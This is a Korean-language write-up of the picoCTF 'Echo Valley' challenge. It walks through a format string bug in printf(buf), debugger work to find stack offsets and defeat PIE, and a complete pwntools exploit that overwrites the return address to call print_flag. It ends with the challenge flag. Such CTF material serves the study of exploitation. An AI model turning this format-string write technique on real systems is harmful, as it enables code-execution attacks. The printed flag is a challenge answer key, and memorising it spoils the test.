# [Echo Valley](https://play.picoctf.org/practice/challenge/485?category=6&originalEvent=74&page=1)
<br />

**Description:**
> The echo valley is a simple function that echoes back whatever you say to it.
But how do you make it respond with something more interesting, like a flag?
<br />

**Source Code:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_flag() {
    char buf[32];
    FILE *file = fopen("/home/valley/flag.txt", "r");

    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }

    fgets(buf, sizeof(buf), file);
    printf("Congrats! Here is your flag: %s", buf);
    fclose(file);
    exit(EXIT_SUCCESS);
}

void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
}

int main()
{
    echo_valley();
    return 0;
}
```
<br />

**Binary Protections:**
```yaml
valley: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=389c2641f0d3caae81af5d21d9bb5bcf2de217f0, for GNU/Linux 3.2.0, with debug_info, not stripped

[*] '/home/kali/pico/valley'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```
<br />
<br />

제공되는 바이너리는 입력된 값을 출력해주는 단순한 구조를 가지고 있습니다. 그러나 `printf(buf)`를 사용하고 있어서 FSB 취약점이 발생합니다. 해당 문제를 풀이하기 위해서는 `RET` 주소를 `print_flag()`로 덮어 호출해야 합니다. 

먼저 `RET`을 덮어야 하므로, gdb를 통해 `RET`과 버퍼의 오프셋은 구합니다.
```yaml
pwndbg> b *echo_valley+76
pwndbg> r
 ► 0x555555555353 <echo_valley+76>    call   fgets@plt                   <fgets@plt>
        s: 0x7fffffffdff0 ◂— 0x40 /* '@' */
        n: 0x64
        stream: 0x7ffff7fab8e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
pwndbg> ni
pwndbg> AAAAAAAA
pwndbg> x/20gx 0x7fffffffdff0
0x7fffffffdff0: 0x4141414141414141      0x000000000000000a
0x7fffffffe000: 0x0000000000010000      0x218c032900000000
0x7fffffffe010: 0x000000aa00000006      0x0000000000000000
0x7fffffffe020: 0x0000000000000000      0x0000000000000000
0x7fffffffe030: 0x0000000000000000      0x0000000000000000
0x7fffffffe040: 0x0000000000000000      0x0000000000000000
0x7fffffffe050: 0x0000000000000000      0x5b41cad1ed51ad00
0x7fffffffe060: 0x00007fffffffe070      0x0000555555555413
0x7fffffffe070: 0x0000000000000001      0x00007ffff7dedca8
0x7fffffffe080: 0x00007fffffffe170      0x0000555555555401

pwndbg> x/gx $rsp
0x7fffffffdff0: 0x4141414141414141
pwndbg> x/a 0x555555555413
0x555555555413 <main+18>:       0xc35d00000000b8
```
위 분석을 통해 버퍼의 시작주소가 `rsp`이고, 오프셋은 6 라는 것을 알 수 있습니다. 해당 정보로 `RET`의 오프셋을 구할 수 있습니다.

```yaml
pwndbg> p 0x7fffffffe068 - 0x7fffffffdff0
$1 = 120
pwndbg> p 120 / 8 + 6
$2 = 21
```
`RET`의 오프셋은 21 입니다.

```yaml
$ ./valley
Welcome to the Echo Valley, Try Shouting:
%21$p
You heard in the distance: 0x56509e762413
```
위에서 오프셋을 구했으니, 이번에는 `RET`의 값을 조작하기 위해 `RET`의 주소를 구하겠습니다.

```yaml
Welcome to the Echo Valley, Try Shouting:
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
You heard in the distance: 0x7fffffffde40.(nil).(nil).(nil).(nil).0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0xa2e70252e70252e.(nil).(nil).(nil).(nil).(nil).0xa92feb16d8bee600.0x7fffffffe070.0x555555555413.
```
위 결과를 보면 가장 마지막 `0x555555555413`은 `RET`이고, 그 앞에 있는 주소 `0x7fffffffe070`가 `rbp` 입니다.

```yaml
pwndbg> telescope 20
...
... ↓                7 skipped
0d:0068│-008         0x7fffffffe058 ◂— 0x5c28d60fb3021e00
0e:0070│ rbp         0x7fffffffe060 —▸ 0x7fffffffe070 ◂— 1
0f:0078│+008         0x7fffffffe068 —▸ 0x555555555413 (main+18) ◂— mov eax, 0
10:0080│+010         0x7fffffffe070 ◂— 1
...
```
위 결과로 `0x7fffffffe070`은 `RET`에서부터 8만큼 떨어져 있음을 알 수 있습니다.

```yaml
pwndbg> p print_flag
$2 = {void ()} 0x555555555269 <print_flag>
pwndbg> p/x 0x555555555413 - 0x555555555269
$3 = 0x1aa
```
그리고 바이너리에는 PIE가 적용되어 있어서 `print_flag()`의 주소를 `main`의 주소를 가지고 오프셋을 따로 구해야 합니다. `print_flag()`의 오프셋은 `0x1aa` 입니다. 

위 정보를 가지고 공격 코드를 작성할 수 있습니다.

<br />

```python
from pwn import *

context.log_level = "error"
context.arch = "amd64"

# p = e.process("./valley")
p = remote("shape-facility.picoctf.net", 51424)

p.sendlineafter(b"\n", b"%20$p.%21$p")
p.recvuntil(b"You heard in the distance: ")

addr = p.recv().decode().strip().split(".")

RET = int(addr[0], 16) - 8
MAIN = int(addr[1], 16)
PFLAG = MAIN - 0x1aa

log.info(f"RET: {RET:#x}")
log.info(f"MAIN: {MAIN:#x}")
log.info(f"PFLAG: {PFLAG:#x}")

chunks = [
        PFLAG & 0xFFFF,
        (PFLAG >> 16) & 0xFFFF,
        (PFLAG >> 32) & 0xFFFF,
]

log.info(f"sending the first {hex(chunks[0])} bytes")
p.sendline(fmtstr_payload(6, {RET: chunks[0]}))
log.info(f"sending the second {hex(chunks[1])} bytes")
p.sendline(fmtstr_payload(6, {RET + 2: chunks[1]}))
log.info(f"sending the third {hex(chunks[2])} bytes")
p.sendline(fmtstr_payload(6, {RET + 4: chunks[2]}))

p.sendline(b"exit\n")
p.interactive()
```

```bash
$ python3 test.py
You heard in the distance:                                                                                                         \xc0                        \x00aa\xa8FO\xa7\xfe\x7f$                                                       You heard in the distance:                                                                                                                                      \xc0                                                  \x00aa\xaaFO\xa7\xfe\x7fYou heard in the distance:                                                                                                                                                                                                                        \xc0                                                                                                                                       \x00a\xacFO\xa7\xfe\x7fThe Valley Disappears
Congrats! Here is your flag: picoctf{f1ckl3_f0rmat_f1asc0}
$
```
